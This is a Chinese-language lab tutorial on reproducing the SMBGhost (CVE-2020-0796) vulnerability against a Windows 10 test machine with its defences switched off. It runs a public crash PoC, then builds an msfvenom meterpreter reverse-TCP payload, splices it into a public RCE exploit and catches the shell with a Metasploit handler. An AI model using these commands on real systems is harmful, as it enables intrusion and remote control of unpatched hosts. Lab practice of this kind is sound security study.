8.永恒之黑漏洞：

1.poc（观点验证脚本，证明漏洞，危害性不大）（蓝屏）

（1）在github上下载源文件

https://github.com/eerykitty/CVE-2020-0796-PoC

（2）点击code，下载zip


注：kali地址：192.168.248.128（使用ifconfig命令查看）
靶机win10地址：192.168.248.130（使用ipconfig命令查看）
靶机要提前将安全中心里的病毒威胁和防火墙关闭

（3）关键步骤

将解压后的文件复制到kali里面，打开文件所在位置，右键在此处打开终端，使用
pip install ntlm_auth命令，再使用
python CVE-2020-0796.py 192.168.248.130（靶机ip）（用python执行这个py脚本文件，并将其地址参数传递给靶机）

（4）执行完成后靶机蓝屏

2.exp(RCE)（漏洞利用脚本，能武器化）

（1）在github上下载源文件

https://github.com/chompie1337/SMBGhost_RCE_PoC

（2）点击code，下载zip


注：kali地址：192.168.248.128（使用ifconfig命令查看）
靶机win10地址：192.168.248.132（使用ipconfig命令查看）

（3）将解压后的源文件复制到kali，打开文件所在位置，右键在此处打开终端

（4）在kali中利用MSF生成木马：

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.248.128 LPORT=5555 -b ‘\x00’ -i 5 -f python > exploit
解释：（生成木马，反弹windows64位系统的meterpreter的反向tcp连接（从靶机到攻击机建立tcp连接）载荷权限到lhost(kali的ip)的5555端口，
lhost是Listener Host（本地端口）的意思，
-b ‘\x00’是因为某些程序或协议不允许空字节出现在特定的数据字段中，
-f python是指生成的载荷将是一个 Python 脚本，

exploit是将 msfvenom 命令的输出重定向到一个名为 exploit 的文件中

5.配置命令

vi exploit或者vim exploit
:%s/buf/USER_PAYLOAD（将生成的exploit文件中的 buf 替换为 USER_PAYLOAD）
:wq

6.将工具中 exploit.py中的USER_PAYLOAD部分替换成exploit文件中的内容

7.监听

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.248.128
set lport 5555
run

8.运行刚修改好的 exploit.py 文件

python3 exploit.py -ip 192.168.248.132（靶机ip）

9.这里试了很多次，没成功运行，msf监听的端口也没成功反弹shell（最后是能做成功的，成功几率小）
